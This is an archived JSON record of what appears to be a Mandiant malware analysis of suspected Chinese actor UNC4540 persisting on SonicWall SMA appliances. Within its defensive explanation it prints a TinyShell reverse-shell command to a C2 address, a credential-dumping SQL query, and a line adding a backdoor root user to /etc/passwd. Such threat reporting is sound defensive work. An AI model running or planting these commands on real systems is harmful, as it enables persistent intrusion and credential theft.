{
    "id": "5cf38b17-4dc5-4f4f-a5aa-36103a2bc406",
    "created_at": "2023-05-06T02:08:31.90539Z",
    "updated_at": "2024-11-22T02:03:28.763998Z",
    "deleted_at": null,
    "sha1_hash": "a06457f9655d3714c212182d6162f6aecd8b884e",
    "title": "2023-03-08 - Suspected Chinese Campaign to Persist on SonicWall Devices, Highlights Importance of Monitoring Edge Devices",
    "authors": "",
    "file_creation_date": "2023-05-05T02:01:22Z",
    "file_modification_date": "2023-05-05T02:01:22Z",
    "file_size": 131218,
    "plain_text": "Suspected Chinese Campaign to Persist on SonicWall\nDevices, Highlights Importance of Monitoring Edge\nDevices\nmandiant.com/resources/blog/suspected-chinese-persist-sonicwall\n\nMandiant, working in partnership with SonicWall Product Security and Incident Response\nTeam (PSIRT), has identified a suspected Chinese campaign that involves maintaining long\nterm persistence by running malware on an unpatched SonicWall Secure Mobile Access\n(SMA) appliance. The malware has functionality to steal user credentials, provide shell\naccess, and persist through firmware upgrades. Mandiant currently tracks this actor as\nUNC4540.\n\nMalware\n\n1/5\n\nAnalysis of a compromised device revealed a collection of files that give the attacker a highly\nprivileged and available access to the appliance. The malware consists of a series of bash\nscripts and a single ELF binary identified as a TinyShell variant. The overall behavior of the\nsuite of malicious bash scripts shows a detailed understanding of the appliance and is well\ntailored to the system to provide stability and persistence. Table 1 contains a list of the\nmalicious files.\nTable 1: Malware files\nPath\n\nHash\n\nFunction\n\n/bin/firewalld\n\ne4117b17e3d14fe64f45750be71dbaa6\n\nMain malware process\n\n/bin/httpsd\n\n2d57bcb8351cf2b57c4fd2d1bb8f862e\n\nTinyShell backdoor\n\n/etc/rc.d/rc.local\n\n559b9ae2a578e1258e80c45a5794c071\n\nBoot persistence for firewalld\n\n/bin/iptabled\n\n8dbf1effa7bc94fc0b9b4ce83dfce2e6\n\nRedundant main malware\nprocess\n\n/bin/geoBotnetd\n\n619769d3d40a3c28ec83832ca521f521\n\nFirmware backdoor script\n\n/bin/ifconfig6\n\nfa1bf2e427b2defffd573854c35d4919\n\nGraceful shutdown script\n\nMain Module\nThe main malware entry point is a bash script named firewalld, which executes its primary\nloop once for a count of every file on the system squared: \u2026for j in $(ls / -R) do for\ni in $(ls / -R) do:\u2026 The script is responsible for executing an SQL command to\naccomplish credential stealing and execution of the other components.\nThe first function in firewalld executes the TinyShell backdoor httpsd with command\nnohup /bin/httpsd -c<C2 IP ADDRESS> -d 5 -m -1 -p 51432 > /dev/null 2>&1 & if\n\nthe httpsd process isn\u2019t already running. This sets TinyShell to reverse-shell mode,\ninstructing it to call out to the aforementioned IP address and port at a specific time and day\nrepresented by the -m flag, with a beacon interval defined by the -d flag. The binary embeds\na hard coded IP address, which is used in reverse-shell mode if the IP address argument is\nleft blank. It also has a listening bind shell mode available.\n\nPrimary Purpose is Likely Credential Theft\n2/5\n\nThe primary purpose of the malware appears to be to steal hashed credentials from all\nlogged in users. It does this in firewalld by routinely executing the SQL command select\nuserName,password from Sessions against sqlite3 database /tmp/temp.db and copying\nthem out to the attacker created text file /tmp/syslog.db. The source database\n/tmp/temp.db is used by the appliance to track session information, including hashed\ncredentials. Once retrieved by the attacker the hashes could be cracked offline.\n\nImplementation Shows Emphasis on Persistence and Stability\nThe attackers put significant effort into the stability and persistence of their tooling. This\nallows their access to the network to persist through firmware updates and maintain a\nfoothold on the network through the SonicWall Device.\n\nRedundant Scripts\nThe startup script rc.local runs firewalld at boot time, but efforts to ensure stability and\npersistence extend beyond that, with functionality designed to enable long-term attacker\naccess.\nA second copy of firewalld named iptabled was also present on the device. iptabled\nwas modified to provide persistence for the main malware process in case of exit or crash.\nThe two scripts were configured to call the other if it was not running, providing a backup\ninstance of the main malware process and therefore an additional layer of resilience.\n\nFirmware Updates Modified to Allow Persistence, Create new Root\nIn addition to ensuring stability, the attackers implemented a process for ensuring their\naccess would persist across firmware updates. The bash script geoBotnetd checks every ten\nseconds for a new firmware upgrade to appear at /cf/FIRMWARE/NEW/INITRD.GZ. If it does,\nthe script will copy the file for backup, unzip it, mount it, and then copy over the whole\npackage of malware files. geoBotnetd also executes echo -e\n\"acme:wegB/YNBuL7QI:0:0:pwned:/acme:/bin/bash\\n\" >> /sda/etc/passwd, which adds\nbackdoor root user acme to the system. Then it rezips everything and puts it back in place\nwith all the malware included, ready for installation. The technique is not especially\nsophisticated, but it does show considerable effort on the part of the attacker to understand\nthe appliance update cycle, then develop and test a method for persistence.\nThe techniques used here, including backdooring update zips and modifying appliance\nbinaries, is consistent with those described in Re-Checking Your Pulse: Updates on Chinese\nAPT Actors Compromising Pulse Secure VPN Devices, although Mandiant tracks these\nthreats separately.\nThese firmware manipulations only occurred post-exploitation on an already infected device,\nand were not seen used in a supply chain attack.\n3/5\n\nPatch Applied to Binary, Potentially to Increase Stability\nIn a similar vein that shows the effort put into tailoring the malware, the main firewalld\nscript includes a function to add a small patch to the legitimate SonicWall binary firebased.\nIt uses a simple sed command to replace the string /sbin/shutdown -r now with bash\n/bin/ifconfig6 in the binary and then creates script /bin/ifconfig6 with contents.\n#!/bin/sh\nifconfig eth0 down\nsleep 90\n/sbin/shutdown -r now\n\nMandiant did not delve into detail on how this would affect the appliance or under what\nconditions it would have an impact, but it is clear from the change that this was intended to\nprovide a graceful close-down of the network controller before executing the shutdown\ncommand. It is likely that the attackers have encountered issues either in use or testing when\nfirebased shuts down the appliance.\n\nLong Term Operation, Initial Infection Vector Unknown\nMandiant was not able to determine the origin of the infection, however, the malware, or a\npredecessor of it, was likely deployed in 2021. Mandiant believes that attacker access has\npersisted through multiple firmware updates.\n\nDetect and Defend\nFirst and foremost, maintaining proper patch management is essential for mitigating the risk\nof vulnerability exploitation. At the time of publishing this blog post, SonicWall urges SMA100\ncustomers to upgrade to 10.2.1.7 or higher, which includes hardening enhancements such\nas File Integrity Monitoring (FIM) and anomalous process identification. A SonicWall blog\npost describing the patch features is available (New SMA Release Updates OpenSSL\nLibrary, Includes Key Security Features) and the patch itself can be found here: Upgrade\nPath For SMA100 Series.\nTo help keep customers secure, SMA100 customers on versions 10.2.1.7 or higher will\nreceive notifications in their Management Console about pending CRITICAL security\nupdates.\nGiven the difficulty in directly examining impacted devices, reviewing available logs for\nsecondary signs of compromise, such as abnormal logins or internal traffic, may offer some\nopportunities for detection. However, applying the recent patch is the best way to limit any\n\n4/5\n\nunexpected tampering or modification of the appliance.\n\nA Pattern of Chinese Network Device Compromises\nDeveloping malware for a managed appliance is often no trivial task. Vendors typically do not\nenable direct access to the Operating System or filesystem for users, instead offering\nadministrators a graphical UI or limited Command Line Interface (CLI) with guardrails\npreventing anyone from accidentally breaking the system. Because of this lack of access,\nattackers require a fair amount of resource and effort to develop exploits and malware for\nmanaged devices.\nIn recent years Chinese attackers have deployed multiple zero-day exploits and malware for\na variety of internet facing network appliances as a route to full enterprise intrusion, and the\ninstance reported here is part of a recent pattern that Mandiant expects to continue in the\nnear term. For further information, see Mandiant blog post: Suspected Chinese Threat Actors\nExploiting FortiOS Vulnerability (CVE-2022-42475). In particular the section \"China\nContinues to Focus on Network Devices\" summarizes some of Mandiant\u2019s recent findings.\n\n5/5",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-08 - Suspected Chinese Campaign to Persist on SonicWall Devices, Highlights Importance of Monitoring Edge Devices.pdf"
    ],
    "report_names": [
        "2023-03-08 - Suspected Chinese Campaign to Persist on SonicWall Devices, Highlights Importance of Monitoring Edge Devices.pdf"
    ],
    "threat_actors": [
        {
            "id": "d54d2676-266b-4bf1-b82c-e8fc576f08ff",
            "created_at": "2024-09-20T02:00:04.563465Z",
            "updated_at": "2024-11-22T02:00:03.073177Z",
            "deleted_at": null,
            "main_name": "UNC4540",
            "aliases": [],
            "source_name": "MISPGALAXY:UNC4540",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1683338911905,
    "ts_updated_at": 1732241008763,
    "ts_creation_date": 1683252082000,
    "ts_modification_date": 1683252082000,
    "files": {
        "pdf": "https://archive.orkl.eu/a06457f9655d3714c212182d6162f6aecd8b884e.pdf",
        "text": "https://archive.orkl.eu/a06457f9655d3714c212182d6162f6aecd8b884e.txt",
        "img": "https://archive.orkl.eu/a06457f9655d3714c212182d6162f6aecd8b884e.jpg"
    }
}